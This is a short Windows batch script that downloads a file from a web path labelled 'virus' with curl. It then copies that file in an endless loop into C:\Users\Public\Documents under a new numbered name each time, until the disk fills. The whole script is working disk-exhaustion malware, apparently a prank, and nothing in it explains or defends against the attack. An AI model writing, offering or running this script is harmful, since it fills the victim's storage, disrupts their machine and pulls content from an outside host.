@echo off

curl -LJO re-mc.github.io/virus/file.txt

set /A fart = 1
goto copy
:var
set /A fart = %fart% + 1
:copy
copy file.txt C:\Users\Public\Documents\file%fart%.txt

goto var

